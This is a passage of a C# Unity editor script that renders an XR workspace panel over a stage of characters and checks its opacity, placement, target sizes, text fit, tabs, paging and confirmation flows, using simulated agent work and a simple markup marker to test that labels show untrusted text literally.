#nullable enable
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Halcyonic.Client;
using Halcyonic.Contracts;
using Halcyonic.XR.UI;
using Halcyonic.XR.UI.Editor;
using TMPro;
using UnityEditor;
using UnityEditor.SceneManagement;
using UnityEngine;

namespace Halcyonic.XR.Workspace.Editor
{
    /// <summary>
    /// Renders the workspace open over the stage, in the editor, where the characters stand 2.4 m away
    /// and where they stand on a desk half a meter away, every screen drawn by the client core's
    /// models (<see cref="WorkspaceScreens"/>) on the frame at touch distance, and checks them: that
    /// nothing behind the workspace shows through it; that it opens clear of every character's body
    /// and label, in the comfortable band; that its targets are 60 dp (48 for the tabs, Close and the
    /// pager) and 12 mm apart, its words large enough, and nothing of Halcyonic's own cut short; that
    /// the tabs fit beside Close; that the activity is a log that never pages and the agent's words
    /// in it lean; the Understanding and Evaluation sections with the demonstration's answers; the
    /// agent's questions, a step at a time, a long one counted as read only after its last part; the
    /// whole request of a very long command, stepped through with Next, Yes locked until its last
    /// part; that every confirmation's Yes stands clear of every control shown before it and since;
    /// hold to talk beside Tell it only where it fits; every New project footer, never four prompts and
    /// each fitting its column; and hostile text on every label that shows
    /// text Halcyonic did not write. The Meta XR Simulator renders nothing on the development Mac, so
    /// this is the check short of a headset. It saves each render as a PNG in
    /// apps/xr/Builds/WorkspaceRenders, which git ignores.
    /// In the editor: Halcyonic > Render the Workspace Over the Stage. In batch mode, with the editor
    /// closed, see docs/internal/runbooks/XR_DEVELOPMENT.md; it exits with 1 when a check fails.
    /// </summary>
    public static partial class WorkspaceRender
    {
        private const int Size = 1024;
        private const float EyeHeight = 1.2f;

        /// <summary>A Quest 3's resolution near the middle of its lenses.</summary>
        private const float QuestPixelsPerDegree = 25f;

        /// <summary>Two channels' worth of rounding, out of 255, before a pixel counts as changed.</summary>
        private const float Tolerance = 2f / 255f;

        /// <summary>Pixels kept off the workspace's outline, where its rounded corners blend.</summary>
        private const int Inset = 12;

        /// <summary>Markup that starts every hostile text; a label that took it as markup would show only "b".</summary>
        private const string Marker = "<b>b</b>";

        private const string Backslash = "\\";

        private const char Ellipsis = '…';

        private const string Time = "2026-10-01T09:00:00.000Z";

        [MenuItem("Halcyonic/Render the Workspace Over the Stage")]
        public static void Menu()
        {
            if (!EditorSceneManager.SaveCurrentModifiedScenesIfUserWantsTo()) return;
            var previous = EditorSceneManager.GetActiveScene().path;
            var failures = GlazeChecks.AtEachTextSize(Run);
            if (!string.IsNullOrEmpty(previous)) EditorSceneManager.OpenScene(previous, OpenSceneMode.Single);
            EditorUtility.DisplayDialog("Workspace render", failures.Count == 0 ? "Every check passed." : string.Join("\n", failures), "OK");
        }

        /// <summary>The batch entry point: exits with 0 when every check passes, 1 otherwise.</summary>
        public static void Check()
        {
            var failures = GlazeChecks.AtEachTextSize(Run);
            EditorApplication.Exit(failures.Count == 0 ? 0 : 1);
        }

        /// <param name="variant">A folder of its own for the renders of a pass, such as the larger text's; empty for the standard pass.</param>
        private static List<string> Run(string variant)
        {
            var folder = Path.GetFullPath(Path.Combine(Application.dataPath, "..", "Builds", "WorkspaceRenders", variant));
            Directory.CreateDirectory(folder);
            var failures = new List<string>();
            try
            {
                EditorSceneManager.NewScene(NewSceneSetup.EmptyScene, NewSceneMode.Single);
                // The stage's default distance and height; the character that waits for the person,
                // in the middle, opened.
                failures.AddRange(RenderStage("far", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null));
                // A desk 0.46 m below the eyes, the lineup 0.55 m ahead, its bodies about 0.1 m above it.
                failures.AddRange(RenderStage("desk", folder, radius: 0.55f, surfaceDrop: 0.46f));
                // Again with a Quest 3S's narrower field measured: the workspace stays inside it.
                ViewField.Current = FieldChecks.Quest3S;
                failures.AddRange(RenderStage("far-3s", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null));
                failures.AddRange(RenderStage("desk-3s", folder, radius: 0.55f, surfaceDrop: 0.46f));
                // The menu's plane (ADR 0026) on the same stages, in the same field.
                failures.AddRange(RenderMenuPlane("far-3s-plane", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null));
                failures.AddRange(RenderMenuPlane("desk-3s-plane", folder, radius: 0.55f, surfaceDrop: 0.46f));
                failures.AddRange(RenderMenuPlane("window-3s-plane", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null, besideWindow: true));
                // The menu's director driving the plane, as WorkspaceDirector will host it.
                keptLessAtLarger = 0;
                failures.AddRange(RenderMenuDirector("far-3s-director", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null));
                failures.AddRange(RenderMenuDirector("desk-3s-director", folder, radius: 0.55f, surfaceDrop: 0.46f));
                failures.AddRange(RenderMenuDirector("window-3s-director", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null, besideWindow: true));
                if (keptLessAtLarger == 0) failures.Add("no director render laid a dragged plane anew where the whole drag broke a rule, so keeping only what holds goes unchecked.");
                // A question of two prompts answered in a task's file and sent from Your answers.
                failures.AddRange(RenderYourAnswers("far-3s", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null));
                // A judge's walk through the menu on the recorded demonstration, from the eyes.
                failures.AddRange(RenderJudgeWalk("far-3s", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null));
                // The demonstration's first visit: the menu on Projects, the stage's demonstration lines raised above it.
                failures.AddRange(RenderDemoWelcome("far-3s", folder, radius: CharacterStage.DefaultDistance, surfaceDrop: null));
                failures.AddRange(RenderDemoWelcome("desk-3s", folder, radius: 0.55f, surfaceDrop: 0.46f));
                // Every New project footer in the file's column: never four prompts, and each fits.
                failures.AddRange(RenderNewProjectFooters(string.IsNullOrEmpty(variant) ? "the standard" : "the larger"));
            }
            catch (Exception error)
            {
                failures.Add(error.ToString());
            }
            finally
            {
                ViewField.Current = null;
                KeepFontAssetsAsCommitted();
            }
            foreach (var failure in failures) Debug.LogError("Halcyonic: workspace render: " + failure);
            if (failures.Count == 0) Debug.Log("Halcyonic: workspace render: every check passed; the renders are in " + folder);
            return failures;
        }

        private static IEnumerable<string> RenderStage(string name, string folder, float radius, float? surfaceDrop)
        {
            var failures = new List<string>();
            var root = new GameObject("Workspace render " + name);
            var texture = new RenderTexture(Size, Size, 24, RenderTextureFormat.ARGB32) { antiAliasing = 1 };
            try
            {
                var eyes = new Vector3(0f, EyeHeight, 0f);
                var camera = MakeCamera(root.transform, eyes, texture);
                var characters = Lineup(root.transform, eyes, radius, surfaceDrop, Presentation);

                // Opened the way the director opens it: the person looking at the character that needs them.
                var opened = characters[3].Target;
                var targets = characters.ConvertAll(character => character.Target);
                var surface = surfaceDrop.HasValue ? EyeHeight - surfaceDrop.Value : (float?)null;
                var (pose, direction) = WorkspaceLayout.Place(opened, targets, eyes, opened.BodyPosition - eyes, surface, new List<BodyInView>());
                var holder = new GameObject("Workspace");
                holder.transform.SetParent(root.transform, false);
                holder.transform.SetPositionAndRotation(pose.position, pose.rotation);
                holder.transform.localScale = Vector3.one * PanelFrame.Scale;
                var panel = WorkspacePanel.Create(holder.transform);
                var view = new View(name, folder, camera, texture, root, panel, characters, eyes);

                // As it opens on work that waits for the person: the approval under Waiting for you.
                var waiting = Work.Approval("Run make migrate");
                view.Show(waiting.Present(), new WorkspaceScreen { Question = WorkspaceQuestion.NeedFromYou }, Steering());
                Backdrop(characters[3].View.transform, eyes, pose);
                if (ViewField.Current is ViewField field)
                {
                    // Read with the head turned toward it, over a desk as well, where it opens above the lineup, tipped
                    // down as much as its bottom needs, at most 8 degrees (WorkspacePlacement.ReadingPitch).
                    failures.AddRange(FieldChecks.Inside(name + ": the workspace", FieldChecks.Corners(view.Frame), eyes, pose.position,
                        WorkspacePlacement.ReadingPitch(WorkspaceLayout.FrameSize, direction.Elevation, field), field));
                }

                var both = Render(camera, texture);
                foreach (var (character, _) in characters) character.gameObject.SetActive(false);
                var panelAlone = Render(camera, texture);
                panel.gameObject.SetActive(false);
                var nothing = Render(camera, texture);
                foreach (var (character, _) in characters) character.gameObject.SetActive(true);
                var stageAlone = Render(camera, texture);
                panel.gameObject.SetActive(true);
                File.WriteAllBytes(Path.Combine(folder, name + ".png"), both.EncodeToPNG());
                File.WriteAllBytes(Path.Combine(folder, name + "-workspace.png"), panelAlone.EncodeToPNG());
                File.WriteAllBytes(Path.Combine(folder, name + "-stage.png"), stageAlone.EncodeToPNG());
                view.CloseUp("need");

                var rect = view.Rect;
                var (changed, largest) = Compare(both, panelAlone, rect);
                // Where the stage draws something inside the workspace's outline when the workspace is not there.
                var passedOver = Compare(stageAlone, nothing, rect).Changed;
                UnityEngine.Object.DestroyImmediate(nothing);
                Debug.Log("Halcyonic: workspace render " + name + ": the workspace's center is " + Degrees(direction.Elevation) + " degrees from eye level, "
                    + (direction.Above ? "above" : "below") + " the characters it passes; " + passedOver + " of its pixels have the stage behind them, and "
                    + changed + " change when the stage is drawn (largest change " + Degrees(largest * 255f) + " of 255).");
                if (passedOver == 0) failures.Add(name + ": nothing of the stage is behind the workspace, so the render checks nothing; move the camera or the stage.");
                if (changed > 0) failures.Add(name + ": " + changed + " pixels of the workspace change when the stage behind it is drawn.");
                if (!direction.Clear) failures.Add(name + ": the workspace covers a character or its label.");
                if (direction.Elevation < WorkspacePlacement.Lowest(WorkspaceLayout.FrameSize) - 0.01f || direction.Elevation > WorkspacePlacement.HighestDegrees + 0.01f)
                {
                    failures.Add(name + ": the workspace's center is outside the comfortable band.");
                }
                foreach (var (character, target) in characters)
                {
                    if (Covered(camera, target, rect)) failures.Add(name + ": " + character.WorkstreamId + "'s body is behind the workspace in the render.");
                    var label = LabelRect(camera, character);
                    if (label.xMin < rect.xMax && label.xMax > rect.xMin && label.yMin < rect.yMax && label.yMax > rect.yMin)
                    {
                        failures.Add(name + ": " + character.WorkstreamId + "'s label is behind the workspace in the render.");
                    }
                }
                UnityEngine.Object.DestroyImmediate(both);
                UnityEngine.Object.DestroyImmediate(panelAlone);
                UnityEngine.Object.DestroyImmediate(stageAlone);
                failures.AddRange(view.Fits("need"));
                failures.AddRange(TabsFit(view));
                failures.AddRange(Sections(view));
                failures.AddRange(Doing(view));
                failures.AddRange(AsksAQuestion(view));
                failures.AddRange(ShowsTheWholeRequest(view));
                failures.AddRange(ConfirmsWhereNothingStood(view));
                failures.AddRange(OffersHoldToTalk(view));
                failures.AddRange(ShowsTextAsWritten(panel, name));
                failures.AddRange(ShowsUntrustedTextLiterally(view));
            }
            finally
            {
                UnityEngine.Object.DestroyImmediate(root);
                texture.Release();
                UnityEngine.Object.DestroyImmediate(texture);
            }
            return failures;
        }

        internal static WorkspaceSteering Steering() => new(new CommandFactory(new ClientInfo { Name = "halcyonic-xr", Version = "render", DeviceLabel = "render" }));

        /// <summary>
        /// The workspace on the render with everything it needs to show a screen and check it, as the
        /// director draws it: each screen from the client core's model, the agent's question split at
        /// the list's width.
        /// </summary>
        private sealed class View
        {
            public View(string name, string folder, Camera camera, RenderTexture texture, GameObject root, WorkspacePanel panel,
                List<(CharacterView View, CharacterTarget Target)> characters, Vector3 eyes)
            {
                Name = name;
                Folder = folder;
                Camera = camera;
                Texture = texture;
                Root = root;
                Panel = panel;
                Characters = characters;
                Eyes = eyes;
            }

            public string Name { get; }

            public string Folder { get; }

            public Camera Camera { get; }

            public RenderTexture Texture { get; }

            public GameObject Root { get; }

            public WorkspacePanel Panel { get; }

            public PanelFrame Frame => Panel.Frame;

            public List<(CharacterView View, CharacterTarget Target)> Characters { get; }

            public Vector3 Eyes { get; }

            /// <summary>The workspace on the render, inset from its rounded edge.</summary>
            public RectInt Rect => ScreenRect(Camera, Frame.transform, Frame.Size);

            /// <summary>Draws a screen as the director does.</summary>
            public PanelModel Show(WorkspacePresentation workspace, WorkspaceScreen screen, WorkspaceSteering steering, SectionPresentation? section = null)
            {
                if (workspace.QuestionToAnswer is QuestionView asked && screen.Place.Draft?.QuestionId != asked.QuestionId)
                {
                    Read(screen, new QuestionDraft(workspace.Execution!.ExecutionId, asked));
                }
                var model = WorkspaceScreens.Screen(workspace, steering, screen);
                Panel.Show(model, section);
                ForceMeshes(Root);
                return model;
            }

            /// <summary>The question's prompts split in parts at the list's width, as the director splits them.</summary>
            public void Read(WorkspaceScreen screen, QuestionDraft draft)
            {
                var parts = draft.Prompts.Select(prompt => (IReadOnlyList<string>)Frame.SplitLines(prompt.Text, WorkspaceScreens.QuestionLines, Frame.InnerWidth)).ToList();
                screen.ReadQuestion(draft, parts);
            }

            /// <summary>Renders the workspace with and without the stage behind it; fails where the stage shows through.</summary>
            public IEnumerable<string> Opaque(string suffix)
            {
                ForceMeshes(Root);
                var withStage = Render(Camera, Texture);
                foreach (var (character, _) in Characters) character.gameObject.SetActive(false);
                var alone = Render(Camera, Texture);
                foreach (var (character, _) in Characters) character.gameObject.SetActive(true);
                File.WriteAllBytes(Path.Combine(Folder, Name + "-" + suffix + ".png"), withStage.EncodeToPNG());
                var (changed, _) = Compare(withStage, alone, Rect);
                UnityEngine.Object.DestroyImmediate(withStage);
                UnityEngine.Object.DestroyImmediate(alone);
                if (changed > 0) yield return Name + " " + suffix + ": " + changed + " pixels of the workspace change when the stage behind it is drawn.";
            }

            /// <summary>The screen as a Quest 3 shows its middle, to judge legibility, and the whole panel, to see every edge.</summary>
            public void CloseUp(string suffix)
            {
                ForceMeshes(Root);
                var image = WorkspaceRender.CloseUp(Camera, Texture, Frame.transform);
                File.WriteAllBytes(Path.Combine(Folder, Name + "-" + suffix + "-closeup.png"), image.EncodeToPNG());
                UnityEngine.Object.DestroyImmediate(image);
                var rotation = Camera.transform.rotation;
                var fieldOfView = Camera.fieldOfView;
                Camera.transform.rotation = Quaternion.LookRotation(Frame.transform.position - Camera.transform.position, Vector3.up);
                Camera.fieldOfView = PanelFrame.WidthDegrees + 6f;
                var whole = Render(Camera, Texture);
                Camera.transform.rotation = rotation;
                Camera.fieldOfView = fieldOfView;
                File.WriteAllBytes(Path.Combine(Folder, Name + "-" + suffix + "-panel.png"), whole.EncodeToPNG());
                UnityEngine.Object.DestroyImmediate(whole);
            }

            /// <summary>
            /// The screen as the eyes see it: its targets 60 dp, 48 for the tabs, Close and the pager,
            /// 12 mm apart and inside the panel; every word at least the caption's size; nothing of
            /// Halcyonic's own cut short; the list on one page, its lines inside the body.
            /// </summary>
            public IEnumerable<string> Fits(string suffix)
            {
                var what = Name + " " + suffix;
                var failures = new List<string>();
                ForceMeshes(Root);
                var buttons = Frame.Buttons.Where(button => !button.Static).ToList();
                failures.AddRange(GlazeChecks.TargetsLargeEnough(buttons, Eyes, what));
                failures.AddRange(GlazeChecks.MicrophoneOnlyWhereHeld(buttons, what));
                failures.AddRange(GlazeChecks.TextLargeEnough(Panel.gameObject, Eyes, what));
                GlazeChecks.ListTextAsSeen(Panel.gameObject, Eyes, what);
                var gap = Glaze.TargetGapMeters / PanelFrame.Distance;
                for (var a = 0; a < buttons.Count; a++)
                {
                    for (var b = a + 1; b < buttons.Count; b++)
                    {
                        if (!Apart(PanelFrame.RectOf(buttons[a]), PanelFrame.RectOf(buttons[b]), gap)) failures.Add(what + ": " + buttons[a].name + " and " + buttons[b].name + " are closer than 12 mm.");
                    }
                }
                var size = Frame.Size;
                foreach (var button in buttons)
                {
                    var rect = PanelFrame.RectOf(button);
                    if (rect.xMin < -size.x / 2f || rect.xMax > size.x / 2f || rect.yMin < -size.y / 2f || rect.yMax > size.y / 2f)
                    {
                        failures.Add(what + ": " + button.name + " runs past the panel's edge.");
                    }
                }
                var section = new HashSet<Component>(Panel.Section.Labels);
                failures.AddRange(NothingOfOursCut(Panel.ShownParts.Where(part => !section.Contains(part)), what, Frame));
                if (Frame.Pages > 1) failures.Add(what + ": the list takes " + Frame.Pages + " pages; the workspace pages only what its screens page.");
                var area = Frame.ListArea;
                foreach (var (label, _) in Frame.ShownLines)
                {
                    label.ForceMeshUpdate();
                    var bottom = label.transform.localPosition.y - label.textInfo.lineCount * GlazeText.LineHeight(label);
                    if (bottom < area.yMin - 1e-3f) failures.Add(what + ": " + label.name + " runs below the body: " + label.text);
                }
                foreach (var (button, _) in Frame.ShownRows)
                {
                    if (PanelFrame.RectOf(button).yMin < area.yMin - 1e-3f) failures.Add(what + ": " + button.name + " runs below the body.");
                }
                if (!Frame.BarIcons) Debug.Log("Halcyonic: workspace render " + what + ": the bar has no room for its icons, so its words stand alone.");
                return failures;
            }
        }

        /// <summary>Two outlines at least <paramref name="gap"/> apart one way or the other.</summary>
        private static bool Apart(Rect a, Rect b, float gap)
        {
            var dx = Mathf.Max(a.xMin - b.xMax, b.xMin - a.xMax);
            var dy = Mathf.Max(a.yMin - b.yMax, b.yMin - a.yMax);
            return dx >= gap * 0.99f || dy >= gap * 0.99f;
        }

        /// <summary>
        /// Work as the control plane reports it, presented as the director presents it: a simulated
        /// runtime that takes instructions while it runs, approvals and stopping reviewed before they
        /// are sent, as the control plane's policy says.
        /// </summary>
        internal sealed class Work
        {
            private Work(string title, string objective, WorkstreamStatus status, ExecutionStatus executionStatus, Action<ExecutionView> setUp,
                AttentionReason? reason, bool reviewAnswers)
            {
                Workstream = new WorkstreamView
                {
                    WorkstreamId = "render-work",
                    ProjectId = "render-project",
                    Title = title,
                    Objective = objective,
                    Status = status,
                    Attention = new Attention
                    {
                        Level = reason != null ? AttentionLevel.ActionRequired : AttentionLevel.None,
                        Reasons = reason != null ? new List<AttentionReason> { reason } : new List<AttentionReason>(),
                    },
                    CurrentExecutionId = "render-execution",
                    ExecutionIds = new List<string> { "render-execution" },
                    CreatedAt = Time,
                    UpdatedAt = Time,
                };
                Execution = new ExecutionView
                {
                    ExecutionId = "render-execution",
                    WorkstreamId = "render-work",
                    ProjectId = "render-project",
                    Runtime = new RuntimeRef { RuntimeId = "render", Kind = "render", DisplayName = "Simulated agent (render)", Synthetic = true },
                    Instruction = "Do the work.",
                    Status = executionStatus,
                    TurnCount = 1,
                    CreatedAt = Time,
                    StartedAt = Time,
                    UpdatedAt = Time,
                };
                setUp(Execution);
                State.ApplySnapshot(new Snapshot
                {
                    Journal = new JournalInfo { JournalId = "render-journal", Origin = JournalOrigin.Live },
                    Position = 1,
                    Projects = new List<ProjectView> { new() { ProjectId = "render-project", Name = "Storefront API", CreatedAt = Time, UpdatedAt = Time } },
                    Workstreams = new List<WorkstreamView> { Workstream },
                    Executions = new List<ExecutionView> { Execution },
                    Commands = new List<CommandView>(),
                    Runtimes = new List<RuntimeDescriptor>
                    {
                        new()
                        {
                            RuntimeId = "render",
                            Kind = "render",
                            DisplayName = "Simulated agent (render)",
                            Synthetic = true,
                            Capabilities = new RuntimeCapabilities
                            {
                                StartExecution = true, InstructAtRest = true, InstructWhileRunning = true,
                                RespondToApproval = true, Interrupt = true, AnswerQuestion = true,
                            },
                        },
                    },
                }, new StateChanges());
                State.ApplyWelcome(new WelcomeMessage
                {
                    Journal = new JournalInfo { JournalId = "render-journal", Origin = JournalOrigin.Live },
                    Head = 1,
                    Resumed = false,
                    ServerTime = Time,
                    CommandPolicies = new List<CommandPolicy>
                    {
                        new() { CommandType = CommandType.ExecutionRespondToApproval, Policy = PolicyCategory.ReviewRequired },
                        new() { CommandType = CommandType.ExecutionInterrupt, Policy = PolicyCategory.ReviewRequired },
                        new() { CommandType = CommandType.ExecutionSendInstruction, Policy = PolicyCategory.LowConsequence },
                        new() { CommandType = CommandType.ExecutionAnswerQuestion, Policy = reviewAnswers ? PolicyCategory.ReviewRequired : PolicyCategory.LowConsequence },
                    },
                });
            }

            public ClientProjection State { get; } = new ClientProjection();

            public WorkstreamView Workstream { get; }

            public ExecutionView Execution { get; }

            public WorkspacePresentation Present(CommandSubmissions? submissions = null, bool live = true) =>
                WorkspacePresenter.Present(Workstream, State, new ActivityLog(), live, submissions);

            /// <summary>Work that waits for an approval of <paramref name="summary"/>, run by <paramref name="tool"/>.</summary>
            public static Work Approval(string summary, string tool = "shell", string title = "Add rate limiting to the sign-in endpoint",
                string objective = "Limit sign-in attempts per address and per account.") =>
                new(title, objective, WorkstreamStatus.WaitingForHuman, ExecutionStatus.WaitingForHuman,
                    execution => execution.PendingApprovals.Add(new ApprovalView
                    {
                        ApprovalId = "render-approval",
                        Subject = new ToolUseSubject { ToolName = tool, Summary = summary },
                        RequestedAt = Time,
                    }),
                    new ApprovalPendingReason { ExecutionId = "render-execution", ApprovalId = "render-approval" }, false);

            /// <summary>Work whose agent asks <paramref name="question"/>, and how many more wait after it.</summary>
            public static Work Asking(QuestionView question, int more = 0, bool reviewAnswers = false) =>
                new("Restyle the dashboard", "Give the dashboard the colour scheme people choose.", WorkstreamStatus.WaitingForHuman, ExecutionStatus.WaitingForHuman,
                    execution =>
                    {
                        execution.PendingQuestions.Add(question);
                        for (var index = 0; index < more; index++)
                        {
                            var after = Scripted();
                            after.QuestionId = "question-after-" + index.ToString(CultureInfo.InvariantCulture);
                            execution.PendingQuestions.Add(after);
                        }
                    },
                    new QuestionPendingReason { ExecutionId = "render-execution", QuestionId = question.QuestionId }, reviewAnswers);

            /// <summary>Work that runs, waiting for nothing.</summary>
            public static Work Running() =>
                new("Add rate limiting to the sign-in endpoint", "Limit sign-in attempts per address and per account.", WorkstreamStatus.Running, ExecutionStatus.Running,
                    _ => { }, null, false);
        }

        /// <summary>A presentation with the activity, what this headset sent, and the character given, as the director shows them.</summary>
        private static WorkspacePresentation With(WorkspacePresentation workspace, IReadOnlyList<ActivityEntry>? activity = null,
            IReadOnlyList<CommandFeedback>? commands = null, CharacterPresentation? character = null, IReadOnlyCollection<WorkspaceAction>? actions = null) =>
            new(character ?? workspace.Character, workspace.Objective, workspace.Execution, workspace.Runtime, actions ?? workspace.Actions,
                (actions ?? workspace.Actions).Where(workspace.RequiresConfirmation).ToList(), commands ?? workspace.Commands, activity ?? workspace.Activity);

        /// <summary>The demonstration's kind of activity: the round, the agent's words, an edit and the request.</summary>
        private static IReadOnlyList<ActivityEntry> Activity(string? claim = null) => new[]
        {
            new ActivityEntry(1, "2026-10-01T09:00:01.000Z", ActivityKind.Turn, "Round started", false),
            new ActivityEntry(2, "2026-10-01T09:00:02.000Z", ActivityKind.Tool, "read: src/auth/sign-in.ts", false),
            new ActivityEntry(3, "2026-10-01T09:00:03.000Z", ActivityKind.Message, claim ?? "Adding a limiter in front of the sign-in handler.", true),
            new ActivityEntry(4, "2026-10-01T09:00:06.000Z", ActivityKind.Tool, "edit: src/auth/rate-limit.ts", false),
            new ActivityEntry(5, "2026-10-01T09:00:09.000Z", ActivityKind.Approval, "It wants to run: Run make migrate", false),
        };

        /// <summary>
        /// The tabs, Waiting for you first in the attention colour and edged as chosen, each whole in
        /// one compact row with Close at its end, 12 mm from it.
        /// </summary>
        private static IEnumerable<string> TabsFit(View view)
        {
            var failures = new List<string>();
            var tabs = view.Frame.Tabs;
            var what = view.Name + " tabs";
            if (tabs.Count != 4) failures.Add(what + ": " + tabs.Count + " tabs show while a request waits, not four.");
            else
            {
                if (tabs[0].Role != ButtonRole.Attention || !tabs[0].On) failures.Add(what + ": Waiting for you is not first, chosen, in the attention colour.");
                if (tabs.Skip(1).Any(tab => tab.On)) failures.Add(what + ": a second tab is marked chosen.");
            }
            var close = view.Frame.ButtonFor(PanelModel.Close);
            if (close == null) failures.Add(what + ": Close does not show.");
            foreach (var tab in tabs)
            {
                tab.Label.ForceMeshUpdate();
                if (tab.Label.isTextTruncated) failures.Add(what + ": " + tab.Label.text + " is cut short.");
                if (close != null && !Apart(PanelFrame.RectOf(tab), PanelFrame.RectOf(close), Glaze.TargetGapMeters / PanelFrame.Distance))
                {
                    failures.Add(what + ": " + tab.Label.text + " runs into Close.");
                }
            }
            if (tabs.Count > 0 && close != null)
            {
                Debug.Log("Halcyonic: workspace render " + what + ": the tabs end at " + PanelFrame.RectOf(tabs[tabs.Count - 1]).xMax.ToString("0.000", CultureInfo.InvariantCulture)
                    + " and Close starts at " + PanelFrame.RectOf(close).xMin.ToString("0.000", CultureInfo.InvariantCulture) + " of the panel's width.");
            }
            return failures;
        }

        /// <summary>
        /// Help me understand's three answers and What was checked? as the demonstration shows them,
        /// every page of each, under their headings with Refresh beside them and Help me understand's
        /// questions as pills between: as opaque as the rest, every line of a page inside the space under
        /// the heading, a part's own statement never cut, and a pager wherever an answer takes more
        /// than a page.
        /// </summary>
        private static IEnumerable<string> Sections(View view)
        {
            var failures = new List<string>();
            var swapped = new SortedSet<char>();
            var running = Work.Running().Present();
            var font = view.Panel.Section.Labels.First().font;
            foreach (var (suffix, question, prompt, answer) in DemonstrationSections())
            {
                // Fitted to the rows the space under the heading holds, measured as the director does.
                var screen = new WorkspaceScreen { Question = question, Prompt = prompt };
                var measured = view.Panel.Room(WorkspaceScreens.Screen(running, Steering(), screen),
                    Swap(answer(AnswerRoom.Unlimited).Provenance, font, swapped));
                // Lines are measured as they are drawn: from the static atlas, so measuring them
                // writes nothing into the committed fallback font.
                var room = new AnswerRoom(measured.Rows, line => measured.RowsOf(InStaticAtlas(line, font, swapped)));
                var section = InStaticAtlas(answer(room), font, swapped);
                screen.ReadAnswer(section, room);
                // A page under another source's provenance, as the measurement's, shows that source's line as its
                // heading rather than as its first line (AnswerPages.Split): it counts as one of the page's lines. The page of
                // its heading alone before another source's page, a source's why it has no answer, holds what it must.
                var pages = screen.AnswerPages;
                bool HeadingAlone(int index) => pages[index].Lines.Count == 0 && index + 1 < pages.Count && pages[index + 1].Provenance != section.Provenance;
                if (pages.Count > 1 && Enumerable.Range(0, pages.Count)
                        .Any(index => !HeadingAlone(index) && pages[index].Lines.Count + (pages[index].Provenance == section.Provenance ? 0 : 1) < 3))
                {
                    failures.Add(view.Name + " " + suffix + ": a page of an answer that pages shows fewer than 3 lines (" + room.Rows + " rows a page).");
                }
                for (var page = 0; page < screen.AnswerPages.Count; page++)
                {
                    var name = suffix + (screen.AnswerPages.Count > 1 ? "-" + (page + 1).ToString(CultureInfo.InvariantCulture) : "");
                    var model = view.Show(running, screen, Steering(), screen.Answer);
                    failures.AddRange(view.Opaque(name));
                    view.CloseUp(name);
                    failures.AddRange(view.Fits(name));
                    // Help me understand reads again by itself, so its pager takes Refresh's place while a flow pages.
                    var refreshes = question != WorkspaceQuestion.Understand || screen.AnswerPages.Count <= 1;
                    if ((view.Frame.ButtonFor(WorkspaceScreens.Refresh) != null) != refreshes)
                    {
                        failures.Add(view.Name + " " + name + ": Refresh " + (refreshes ? "does not show beside the heading." : "shows beside a paging flow."));
                    }
                    var pills = view.Frame.Prompts.Count;
                    if (pills != (question == WorkspaceQuestion.Understand ? 3 : 0)) failures.Add(view.Name + " " + name + ": " + pills + " of Help me understand's questions show.");
                    var pager = view.Frame.ButtonFor(PanelModel.NextPart) != null;
                    if (pager != screen.AnswerPages.Count > 1) failures.Add(view.Name + " " + name + ": the pager " + (pager ? "shows for an answer of one page." : "is missing."));
                    if (model.Parts is (int at, _) && at != page) failures.Add(view.Name + " " + name + ": the pager says page " + (at + 1) + ".");
                    failures.AddRange(SectionFits(view.Panel.Section, view.Name + " " + name, screen.Answer!));
                    screen.TurnAnswer(1);
                }
            }
            if (swapped.Count > 0)
            {
                Debug.Log("Halcyonic: workspace render " + view.Name + ": drawn in the renders from the static atlas instead, since a headset draws them from the dynamic fallback: "
                    + string.Join(", ", swapped.Select(character => "U+" + ((int)character).ToString("X4", CultureInfo.InvariantCulture))) + ".");
            }
            return failures;
        }

        /// <summary>
        /// Every line of a page of a section is shown inside the space under its heading, on no more
        /// rows than it may take, and a part's availability, coverage and freshness is never cut short.
        /// </summary>
        private static IEnumerable<string> SectionFits(SectionView sectionView, string what, SectionPresentation section)
        {
            var failures = new List<string>();
            var lines = sectionView.Labels.Where(label => label.name.StartsWith("Line ", StringComparison.Ordinal) && label.gameObject.activeSelf).ToList();
            if (lines.Count != section.Lines.Count) failures.Add(what + ": " + lines.Count + " of its " + section.Lines.Count + " lines fit.");
            var cut = 0;
            foreach (var label in sectionView.Labels.Where(label => label.gameObject.activeSelf))
            {
                label.ForceMeshUpdate();
                var bottom = label.transform.localPosition.y - label.textInfo.lineCount * GlazeText.LineHeight(label);
                if (bottom < sectionView.Area.yMin - 1e-3f) failures.Add(what + ": " + label.name + " runs below the space under the heading.");
            }
            for (var index = 0; index < lines.Count; index++)
            {
                if (!lines[index].isTextTruncated) continue;
                cut++;
                if (index < section.Lines.Count && section.Lines[index].Detail) failures.Add(what + ": a part's own statement is cut short: " + lines[index].name);
            }
            Debug.Log("Halcyonic: workspace render " + what + ": " + lines.Count + " lines, " + cut + " ending in an ellipsis.");
            return failures;
        }

        /// <summary>
        /// What is it doing?, as work runs: the answer, what this headset sent, and the log, whose
        /// older lines give way rather than page, its newest last; the agent's words lean, and a claim
        /// cut short ends in an ellipsis. Then the same while Stop asks to be confirmed, when Yes takes
        /// a row of the body.
        /// </summary>
        private static IEnumerable<string> Doing(View view)
        {
            var failures = new List<string>();
            var commands = new[]
            {
                new CommandFeedback("c2", CommandType.ExecutionSendInstruction, CommandStatus.Accepted, "Sent. Waiting for the agent…"),
                new CommandFeedback("c1", CommandType.ExecutionRespondToApproval, CommandStatus.Completed, "Confirmed: it has your decision."),
            };
            var running = With(Work.Running().Present(), Activity(LongQuote()), commands);
            var screen = new WorkspaceScreen { Zone = TimeZoneInfo.Utc, ActivityNote = " (times in UTC)", Speak = true };
            var steering = Steering();
            view.Show(running, screen, steering);
            failures.AddRange(view.Opaque("doing"));
            view.CloseUp("doing");
            failures.AddRange(view.Fits("doing"));
            failures.AddRange(LogHolds(view, running, view.Name + " doing"));

            // Stop asks to be confirmed; the log gives way to Yes's row.
            if (steering.Press(WorkspaceAction.Interrupt, running).Step != SteeringStep.Confirm) failures.Add(view.Name + " doing: Stop does not ask to be confirmed.");
